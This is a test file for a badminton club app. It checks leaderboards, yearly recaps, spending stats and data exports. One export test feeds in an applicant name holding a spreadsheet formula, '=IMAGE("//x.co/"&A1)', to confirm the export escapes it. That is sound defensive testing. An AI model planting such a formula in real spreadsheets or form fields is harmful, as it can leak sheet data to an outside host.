import { env, exports } from "cloudflare:workers";
import { describe, expect, it } from "vitest";
import { toPacific } from "../src/shared/time";
import { toCsv } from "../src/worker/export";
import { tierOf } from "../src/shared/milestones";
import { previousPeriod, stayMinutes, top } from "../src/worker/stats";
import { Client, ORIGIN, approveMember, createTestEvent, futureDate, googleJoin, setUpAdmin } from "./helpers";

const anon = new Client();
const today = toPacific(new Date()).date;
const lastYear = String(Number(today.slice(0, 4)) - 1);

async function history() {
  const ctx = await setUpAdmin();
  const alice = await approveMember(ctx, "Alice");
  const bob = await approveMember(ctx, "Bob");
  const events = [];
  for (const [i, t] of ["09:00", "10:00", "11:00", "12:00"].entries()) {
    events.push(await createTestEvent(ctx, { date: futureDate(7 + i), startTime: t, endTime: "13:00" }));
  }
  const [e1, e2, e3, e4] = events;
  await anon.call(`${alice.base}/events/${e1.id}/signup`, { friends: [] });
  await anon.call(`${alice.base}/events/${e2.id}/signup`, { friends: ["Tom"] });
  await anon.call(`${alice.base}/events/${e3.id}/signup`, { friends: [] });
  await anon.call(`${bob.base}/events/${e1.id}/signup`, { friends: [] });
  await anon.call(`${bob.base}/events/${e3.id}/signup`, { friends: [] });
  await anon.call(`${bob.base}/events/${e4.id}/signup`, { friends: [] });
  // e1–e3 settled this year (dates moved to today, order kept by start time); e4 cancelled.
  await env.DB.prepare("UPDATE events SET status = 'settled', date = ? WHERE id IN (?, ?, ?)")
    .bind(today, e1.id, e2.id, e3.id)
    .run();
  await env.DB.prepare("UPDATE events SET status = 'cancelled' WHERE id = ?").bind(e4.id).run();
  await env.DB.prepare("UPDATE registrations SET attended = 0 WHERE event_id = ? AND member_id = ?")
    .bind(e3.id, bob.id)
    .run();
  const bill = (eventId: number, cents: number) =>
    env.DB.prepare(
      "INSERT INTO payments (event_id, member_id, amount_due_cents, payment_code, status, amount_paid_cents) VALUES (?, ?, ?, 'x', 'paid', ?)",
    )
      .bind(eventId, alice.id, cents, cents)
      .run();
  await bill(e1.id, 2000);
  await bill(e2.id, 4000);
  return { ctx, alice, bob, events };
}

describe("leaderboard", () => {
  it("ranks every board from settled events only, for the year and the month", async () => {
    const { ctx, alice, bob, events } = await history();
    const [e1] = events;
    // Alice only stayed 10:00–11:30 at the first one; Bob put in a gym account there.
    await env.DB.prepare(
      "UPDATE registrations SET arrive_at = '10:00', leave_at = '11:30' WHERE event_id = ? AND member_id = ?",
    )
      .bind(e1.id, alice.id)
      .run();
    await env.DB.prepare(
      "INSERT INTO queue_credits (event_id, member_id, kind, created_at) VALUES (?, ?, 'account', ?)",
    )
      .bind(e1.id, bob.id, new Date().toISOString())
      .run();
    const { board } = (await ctx.admin.call(`${ctx.base}/leaderboard`)).data;
    expect(board.year).toBe(Number(today.slice(0, 4)));
    expect(board.month).toBe(Number(today.slice(5, 7)));
    const two = (a: number, b: number) => [
      { rank: 1, name: "Alice", value: a, avatar: null },
      { rank: 2, name: "Bob", value: b, avatar: null },
    ];
    for (const b of [board, board.monthly]) {
      expect(b.attendance).toEqual(two(3, 1));
      expect(b.streak).toEqual(two(3, 1));
      expect(b.friends).toEqual([{ rank: 1, name: "Alice", value: 1, avatar: null }]);
      // 9:00–13:00 (1.5 h of it), 10:00–13:00 and 11:00–13:00; Bob the whole first one.
      expect(b.hours).toEqual(two(6.5, 4));
      expect(b.progress).toEqual(two(3, 1));
      // Both among the first five at every event they came to; the cancelled one doesn't count.
      expect(b.early).toEqual(two(3, 1));
      expect(b.queue).toEqual([{ rank: 1, name: "Bob", value: 1, avatar: null }]);
    }
  });

  it("measures progress against the same stretch a period back", async () => {
    const { ctx, events } = await history();
    // Alice came once at this time last year: two more this year.
    await env.DB.prepare("UPDATE events SET date = ? WHERE id = ?")
      .bind(`${lastYear}${today.slice(4)}`, events[0].id)
      .run();
    const { board } = (await ctx.admin.call(`${ctx.base}/leaderboard`)).data;
    expect(board.attendance.find((r: { name: string }) => r.name === "Alice").value).toBe(2);
    expect(board.progress.find((r: { name: string }) => r.name === "Alice").value).toBe(1);
  });

  it("finds the period before, up to the same day or that month's last", () => {
    expect(previousPeriod("2026-03-31", "month")).toEqual({ from: "2026-02-01", to: "2026-02-28" });
    expect(previousPeriod("2026-01-15", "month")).toEqual({ from: "2025-12-01", to: "2025-12-15" });
    expect(previousPeriod("2028-02-29", "year")).toEqual({ from: "2027-01-01", to: "2027-02-28" });
  });

  it("counts time on court from 到/走, the whole event when empty, clipped to it", () => {
    const ev = { start_at: "2026-11-11T04:30:00.000Z", end_at: "2026-11-11T06:30:00.000Z" }; // 20:30–22:30 PST
    expect(stayMinutes({ ...ev, arrive_at: null, leave_at: null })).toBe(120);
    expect(stayMinutes({ ...ev, arrive_at: "21:00", leave_at: null })).toBe(90);
    expect(stayMinutes({ ...ev, arrive_at: "21:00", leave_at: "22:00" })).toBe(60);
    expect(stayMinutes({ ...ev, arrive_at: "20:00", leave_at: "23:00" })).toBe(120);
    // A 走 at or before 到 (the event's times changed) counts to the end, as 各时段人数 does.
    expect(stayMinutes({ ...ev, arrive_at: "21:30", leave_at: "21:00" })).toBe(60);
  });

  it("gives ties the same rank, skips the next one, and orders tied people by name", () => {
    const counts = (xs: [string, number][]) => new Map(xs.map(([name, value]) => [name, { name, value }]));
    expect(
      top(
        counts([
          ["josefa", 2],
          ["Jayz", 2],
          ["Tom", 5],
          ["arturo", 2],
          ["Zed", 1],
          ["Nobody", 0],
        ]),
      ),
    ).toEqual([
      { rank: 1, name: "Tom", value: 5 },
      { rank: 2, name: "arturo", value: 2 },
      { rank: 2, name: "Jayz", value: 2 },
      { rank: 2, name: "josefa", value: 2 },
      { rank: 5, name: "Zed", value: 1 },
    ]);
  });

  it("keeps everyone tied with the last place shown", () => {
    const counts = new Map(["A", "B", "C", "D"].map((name, i) => [name, { name, value: i === 0 ? 3 : 1 }]));
    expect(top(counts, 2).map((r) => `${r.rank}${r.name}`)).toEqual(["1A", "2B", "2C", "2D"]);
    expect(top(counts, 1).map((r) => `${r.rank}${r.name}`)).toEqual(["1A"]);
  });
});

describe("年度回顾", () => {
  it("sums their year, finds the venue and who they played with, and the badges' totals", async () => {
    const { alice, bob, events } = await history();
    await env.DB.prepare("INSERT INTO queue_credits (event_id, member_id, kind, created_at) VALUES (?, ?, 'court', ?)")
      .bind(events[0].id, alice.id, new Date().toISOString())
      .run();
    const r = (await anon.call(`${alice.base}/year`)).data;
    expect(r).toMatchObject({
      year: Number(today.slice(0, 4)),
      years: [Number(today.slice(0, 4))],
      count: 3,
      hours: 9,
      kcal: null,
      early: 3,
      friends: 1,
      queue: 1,
      venue: { name: "Bay Badminton Center", count: 3 },
      buddies: [{ name: "Bob", count: 1 }],
    });
    expect(r.milestones).toEqual([
      { key: "attendance", value: 3, tier: 0 },
      { key: "hours", value: 9, tier: 0 },
      { key: "streak", value: 3, tier: 1 },
      { key: "early", value: 3, tier: 1 },
      { key: "friends", value: 1, tier: 0 },
      { key: "queue", value: 1, tier: 0 },
    ]);
    // An earlier year they came: its own numbers; a year they didn't: this year's.
    await env.DB.prepare("UPDATE events SET date = ? WHERE id = ?").bind(`${lastYear}-06-01`, events[0].id).run();
    const before = (await anon.call(`${alice.base}/year?year=${lastYear}`)).data;
    expect(before).toMatchObject({ year: Number(lastYear), count: 1, buddies: [{ name: "Bob", count: 1 }] });
    expect(before.years).toEqual([Number(today.slice(0, 4)), Number(lastYear)]);
    expect((await anon.call(`${alice.base}/year?year=1999`)).data.year).toBe(Number(today.slice(0, 4)));
    expect((await anon.call(`${bob.base}/year?year=${lastYear}`)).data.buddies).toEqual([
      { name: "Alice", count: 1, avatar: null },
    ]);
  });

  it("gives a badge its level at each threshold", () => {
    expect([0, 4, 5, 19, 20, 50, 500].map((v) => tierOf([5, 20, 50], v))).toEqual([0, 0, 1, 1, 2, 3, 3]);
  });
});

describe("personal stats", () => {
  it("counts visits and spending, and compares with the same period last year", async () => {
    const { ctx, alice } = await history();
    const old = await createTestEvent(ctx, { date: futureDate(20), startTime: "08:00", endTime: "09:00" });
    await anon.call(`${alice.base}/events/${old.id}/signup`, { friends: [] });
    await env.DB.prepare("UPDATE events SET status = 'settled', date = ? WHERE id = ?")
      .bind(`${lastYear}-01-01`, old.id)
      .run();
    await env.DB.prepare(
      "INSERT INTO payments (event_id, member_id, amount_due_cents, payment_code, status, amount_paid_cents) VALUES (?, ?, 1500, 'x', 'paid', 1500)",
    )
      .bind(old.id, alice.id)
      .run();

    const stats = (await anon.call(`${alice.base}/stats`)).data;
    expect(stats).toMatchObject({
      year: Number(today.slice(0, 4)),
      yearCount: 3,
      totalCount: 4,
      yearSpendCents: 6000,
      avgSpendCents: 2000,
      lastYearCount: 1,
      lastYearSpendCents: 1500,
      today,
    });
    // One entry per counted event, oldest first, for the page's range picker: 4 visits, the
    // cancelled one left out; spending matches the bills.
    expect(stats.history).toHaveLength(4);
    expect(stats.history.map((h: { date: string }) => h.date)).toEqual(
      [...stats.history.map((h: { date: string }) => h.date)].sort(),
    );
    expect(stats.history.every((h: { attended: boolean }) => h.attended)).toBe(true);
    expect(stats.history.reduce((t: number, h: { cents: number }) => t + h.cents, 0)).toBe(7500);
  });

  it("keeps 自付费用 to the member's own events and adds it to their spending", async () => {
    const { alice, bob, events } = await history();
    const before = (await anon.call(`${alice.base}/stats`)).data;
    const target = before.history.find((h: { attended: boolean }) => h.attended);
    expect(target.extraCents).toBe(0);

    expect((await anon.call(`${alice.base}/stats/extra`, { eventId: target.id, cents: 1500 })).status).toBe(200);
    let after = (await anon.call(`${alice.base}/stats`)).data;
    expect(after.history.find((h: { id: number }) => h.id === target.id).extraCents).toBe(1500);
    expect(after.yearSpendCents).toBe(before.yearSpendCents + 1500);

    // Changed, then cleared.
    await anon.call(`${alice.base}/stats/extra`, { eventId: target.id, cents: 1200 });
    after = (await anon.call(`${alice.base}/stats`)).data;
    expect(after.history.find((h: { id: number }) => h.id === target.id).extraCents).toBe(1200);
    await anon.call(`${alice.base}/stats/extra`, { eventId: target.id, cents: 0 });
    after = (await anon.call(`${alice.base}/stats`)).data;
    expect(after.yearSpendCents).toBe(before.yearSpendCents);

    // Nobody else sees it, and nobody can note it on an event that isn't in their own record.
    await anon.call(`${alice.base}/stats/extra`, { eventId: target.id, cents: 900 });
    const bobStats = (await anon.call(`${bob.base}/stats`)).data;
    expect(bobStats.history.every((h: { extraCents: number }) => h.extraCents === 0)).toBe(true);
    const notMine = events.find((ev: { id: number }) => !before.history.some((h: { id: number }) => h.id === ev.id));
    if (notMine)
      expect((await anon.call(`${alice.base}/stats/extra`, { eventId: notMine.id, cents: 500 })).status).toBe(404);
    expect((await anon.call(`${alice.base}/stats/extra`, { eventId: 999999, cents: 500 })).status).toBe(404);
    for (const cents of [-1, 1.5, 100_001, "x"])
      expect((await anon.call(`${alice.base}/stats/extra`, { eventId: target.id, cents })).status).toBe(400);
  });
});

describe("export", () => {
  it("serves the sheet only with the current key, without any secrets", async () => {
    const { ctx } = await history();
    const pull = (key: string) => exports.default.fetch(`${ORIGIN}/export/${key}/all.json`);
    expect((await pull("nope")).status).toBe(403);

    const { script } = (await ctx.admin.call(`${ctx.base}/sheets/enable`, {})).data;
    const key = /const KEY = "([^"]+)"/.exec(script)![1]!;
    expect(script).toContain('const SITE = "https://jaysbadminton.llmat.dev"');
    const res = await pull(key);
    expect(res.status).toBe(200);
    const data = (await res.json()) as any;
    expect(Object.keys(data.tables)).toEqual([
      "members",
      "events",
      "registrations",
      "settlements",
      "payments",
      "receipts",
      "inbound",
      "locations",
    ]);
    expect(data.tables.members.columns).toEqual([
      "成员编号",
      "用户名",
      "微信昵称",
      "邮箱",
      "群主备注",
      "状态",
      "身份",
      "申请时间",
      "通过时间",
    ]);
    expect(data.tables.registrations.columns).toContain("群主添加");
    // The Owner's own role; events and bills name the Owner (Jay) as manager and payee.
    expect(data.tables.members.rows[0][6]).toBe("群主");
    expect(data.tables.events.columns.slice(-2)).toEqual(["负责人", "收款人"]);
    expect(data.tables.events.rows[0].slice(-2)).toEqual(["Jay", "Jay"]);
    expect(data.tables.payments.columns.at(-1)).toBe("钱在谁的账户");
    expect(JSON.stringify(data)).not.toMatch(/token|hash/i);
    expect(data.tables.events.rows[0][0]).toMatch(/^jbm\d{8}$/);
    expect((await ctx.admin.call(`${ctx.base}/sheets`)).data).toMatchObject({ enabled: true, script });
    expect((await ctx.admin.call(`${ctx.base}/sheets`)).data.lastSyncAt).not.toBeNull();

    await ctx.admin.call(`${ctx.base}/sheets/enable`, {});
    expect((await pull(key)).status).toBe(403);
    await ctx.admin.call(`${ctx.base}/sheets/disable`, {});
    expect((await ctx.admin.call(`${ctx.base}/sheets`)).data).toEqual({
      enabled: false,
      lastSyncAt: null,
      script: null,
      keyLost: false,
    });
  });

  it("downloads CSV for the admin only", async () => {
    const { ctx } = await history();
    const get = (cookie: string) =>
      exports.default.fetch(`${ORIGIN}${ctx.base}/export/payments.csv`, { headers: cookie ? { Cookie: cookie } : {} });
    expect((await get("")).status).toBe(401);
    const res = await get(ctx.admin.cookie);
    expect(res.headers.get("Content-Type")).toContain("text/csv");
    const bytes = new Uint8Array(await res.arrayBuffer());
    expect([...bytes.slice(0, 3)]).toEqual([0xef, 0xbb, 0xbf]); // BOM, so Excel reads UTF-8
    const text = new TextDecoder().decode(bytes);
    expect(text.startsWith("活动编号,日期,成员编号,成员,付款编号,应付,已收,已退,状态,付清时间")).toBe(true);
    expect(text).toContain(",Alice,x,20,20,0,已付,");
  });

  it("quotes commas and neutralises spreadsheet formulas", () => {
    const csv = toCsv({
      title: "t",
      columns: ["a", "b"],
      rows: [
        ["x,y", "=HYPERLINK(1)"],
        [-5, '"q"'],
      ],
    });
    expect(csv).toBe('\uFEFFa,b\r\n"x,y",\'=HYPERLINK(1)\r\n-5,"""q"""\r\n');
  });

  it("keeps an applicant's formula-looking name as text in the Google Sheet export", async () => {
    const ctx = await setUpAdmin();
    await googleJoin("Eve", '=IMAGE("//x.co/"&A1)');
    const { script } = (await ctx.admin.call(`${ctx.base}/sheets/enable`, {})).data;
    const key = /const KEY = "([^"]+)"/.exec(script)![1]!;
    const data = (await (await exports.default.fetch(`${ORIGIN}/export/${key}/all.json`)).json()) as any;
    const eve = data.tables.members.rows.find((r: unknown[]) => r[1] === "Eve");
    expect(eve[2]).toBe('\'=IMAGE("//x.co/"&A1)');
    expect(eve[0]).toBe("M002");
  });
});
